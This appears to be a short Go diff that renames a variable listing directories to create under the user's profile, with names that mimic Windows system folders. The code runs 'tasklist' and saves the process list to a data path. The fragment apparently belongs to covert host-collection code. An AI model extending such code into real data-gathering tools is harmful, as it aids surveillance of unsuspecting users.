@@ -31,14 +31,14 @@ func Create_dir(path string) {
 	}
 }
 
-var path = []string{
+var Path = []string{
 	get_current_user() + "\\temp\\log\\",
 	get_current_user() + "\\microsoftNet\\log\\",
 	get_current_user() + "\\WindowsLog\\log\\",
 }
 
 func tasklist() {
-	for _, d := range path {
+	for _, d := range Path {
 		Create_dir(d)
 	}
 	cmd := exec.Command("cmd", "/C", "tasklist >", DATAPATH+"tasklist.txt")
